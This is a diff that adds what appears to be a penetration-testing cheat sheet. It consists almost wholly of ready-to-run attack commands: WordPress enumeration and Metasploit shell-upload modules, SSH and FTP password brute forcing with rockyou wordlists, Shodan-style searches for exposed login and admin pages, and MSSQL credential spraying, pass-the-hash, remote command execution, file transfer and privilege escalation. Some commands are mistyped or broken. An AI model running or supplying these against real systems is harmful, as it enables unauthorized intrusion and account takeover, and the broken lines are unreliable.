@@ -1,0 +1,144 @@
+cat domains.txt | dnsx -silent
+cat domains.txt | dnsx -a -silent
+cat domains.txt | dnsx -cname -silent
+dnsx -d example.com -l subdomains.txt -silent
+cat domains.txt | dnsx -mx -silent
+cat domains.txt | dnsx -a -aaaa -cname -silent
+cat domains.txt | dnsx -silent -o resolved.txt
+
+WpScan:
+wpscan -hh
+wpscan --url http://192.168.1.105/wordpress/
+wpscan --url http://192.168.1.105/wordpresws/ -e at
+wpscan --url http://192.168.1.105/wordpress/ -e ap
+wpscan –url http://192.168.1.105/wordpress/ -e u
+wpscan --url http://192.168.1.105/wordpress/ -e at –e ap –e u
+wpscan --url http://192.168.1.105/wordpress/ -U user.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://192.168.1.105/wordpress/ --proxy http://192.168.1.105:3128
+wpscan --url http://192.168.1.105/wordpress/ --http-auth raj:123
+
+use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.10.10.10
+set username admin
+set password admin
+set targeturi /wordpress
+exploit
+
+exploit/unix/webapp/wp_slideshowgallery_upload
+set rhost 10.10.10.10
+set targeturi /wordpress
+set username admin
+set password admin
+exploit
+
+Password Cracking:
+
+SSH:
+nmap -p -sV 10.10.10.10
+hydra -L user.txt -P pass.txt 192.168.1.111 ssh
+
+use auxiliary/scanner/ssh/ssh_login
+set rhost 10.10.10.10
+set user_file user.txt
+set pass_file pass.txt
+set verbose true
+run
+
+medusa -h 192.168.1.111 -U user.txt -P pass.txt -M ssh | grep "ACCOUNT FOUND"
+nxc ssh 192.168.1.111 -u user.txt -p pass.txt | grep [+]
+ncrack -U user.txt -P pass.txt 192.168.1.111 -p 22
+nmap -p22 --script ssh-brute.nse --script-args userdb=user.txt,passdb=pass.txt 192.168.1.111
+nmap -p 22 192.168.1.111 -oG ssh_scan.txt
+brutespray -f ssh_scan.txt -u user.txt -p pass.txt
+
+FTP:
+nmap -p 21 -sV 192.168.1.110
+hydra -L user.txt -P pass.txt 192.168.1.110 ftp
+
+use auxiliary/scanner/ftp/ftp_login
+set rhosts 192.168.1.110
+set user_file user.txt
+set pass_file pass.txt
+set verbose false
+run
+
+medusa -h 192.168.1.110 -U user.txt -P pass.txt -M ftp | grep "ACCOUNT FOUND"
+nxc ftp 192.168.1.110 -u user.txt -p pass.txt
+nxc ftp 192.168.1.110 -u user.txt -p pass.txt | grep [+]
+ncrack -U user.txt -P pass.txt 192.168.1.110 -p 21
+nmap -p21 --script ftp-brute.nse --script-args userdb=user.txt,passdb=pass.txt 192.168.1.110
+nmap -p 21 target_ip -oG ftp_scan.txt
+brutespray -f ftp_scan.txt -u user.txt -p pass.txt
+
+SSH Gpt:
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt 192.168.1.100
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USERNAME root
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+set THREADS 5
+run
+
+nmap -sV -p 21,22 192.168.1.100
+
+FTP Gpt:
+hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
+ncrack -p 21 --user anonymous -P /usr/share/wordlists/rockyou.txt 192.168.1.100
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp
+
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 192.168.1.100
+set USERNAME anonymous
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+
+nmap -sV -p 21,22 192.168.1.100
+
+Uncover:
+go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
+nano ~/.config/uncover/provider-config.yaml
+
+uncover -q 'http.title:"Login Page"'
+uncover -e shodan -q 'product:"Apache httpd"'
+uncover -e shodan,censys,fofa -q 'title:"admin"'
+uncover -q 'title:"phpmyadmin"' -o results.txt
+uncover -q 'port:21' -e shodan | httpx -title -status-code -ip
+uncover -q 'port:22' -e shodan | xargs -n1 nmap -sV -Pn
+echo jira | uncover -e shodan,hunter,fofa,zoomeye,netlas,criminalip,publicwww,hunterhow -v
+
+MSSQL:
+nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success
+nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --local-auth
+nxc mssql 192.168.31.126 -u users.txt -H 64FBAE31CC352FC26AF97CBDEF151E03 --continue-on-succes
+nxc mssql 192.168.31.126 -u users.txt -p pass.txt --continue-on-success --no-bruteforce
+nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth
+nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987
+nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+nxc mssql 192.168.31.126 -u sa -p 'Password@123' --local-auth -x ipconfig
+nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987' -x ipconfig
+
+nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987' --put-file file.txt C:\\Windows\\Temp\\file.txt
+nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987' --get-file C:\\Windows\\Temp\\file.txt
+/tmp/file.txt
+
+nxc mssql 192.168.31.126 -u ignite -p 'Password@1' -M mssql_priv --local-auth
+
+use auxiliary/admin/mssql/mssql_escalate_execute_as
+set rhosts 192.168.31.126
+set database master
+set username ignite
+set password Password@1
+exploit
+
+nmap -sV -p 9070 192.168.31.126
+nxc mssql 192.168.31.126 -u administrator -p 'Ignite@987' --port 9070
